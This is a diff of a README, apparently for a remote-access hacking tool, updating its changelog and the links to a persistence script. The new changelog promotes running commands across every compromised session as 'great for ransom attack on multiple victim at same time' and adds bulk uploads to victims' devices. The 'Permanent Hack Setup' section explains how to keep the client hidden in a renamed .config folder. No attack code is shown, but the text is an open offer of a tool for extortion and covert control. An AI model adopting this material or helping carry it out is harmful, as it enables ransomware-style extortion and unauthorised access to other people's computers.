@@ -1,14 +1,18 @@
 <details>
-  <summary><b>✨ New version-7.9.5</b></summary>
+  <summary><b>✨ New version-8</b></summary>
   <br>
   
-> **Both Windows and Macos shell feature fixed** 🌐
+> **Some upex related features added, you can upex on multiple/all sessions, great for ransom attack on multiple victim at same time** 🌐
+
+> **upload new features added too , you can upload to multiple devices using single command**
+
+> **You can read them : Extra/ upload-new-feature.txt & upex-more-new-feature.txt**
 
 > **some bugs fixed & so on**
 
 > **If you find issues, jump back to previous one**
 
-> **All client has cross platform support but py is mainly for linux, cs for windows, js for mac**
+
 
 </details>
 
@@ -289,7 +293,7 @@ python controller.py
 ## 🛡️ Permanent Hack Setup
 **You need to download auto.py. To know what auto.py is and to get latest update check:** 👇
 
-https://github.com/boss-defender/Auto-Py.git
+https://github.com/boss-defender/Auto_Run.git
 
 **Importantly , You can change .configs to any folder name like .msdxs or visible-folder etc in auto.py** 📂
 
@@ -420,7 +424,7 @@ C:\Users\<user-name>\.config
 **Then check for two files: 1) auto.py & 2) Client.py** ✅
 
 **If you don't find auto.py then download it from here :** -> 
-https://github.com/boss-defender/Auto-Py.git
+https://github.com/boss-defender/Auto_Run.git
 
 **Then put auto.py in .config folder only if auto.py was not there** 📥
 
@@ -435,7 +439,7 @@ python auto.py client.py --stop
 
 **Again to know more about auto.py and its feature go this link and read README.md file.** 📖
 
-https://github.com/boss-defender/Auto-Py.git
+https://github.com/boss-defender/Auto_Run.git
 
 ---
 
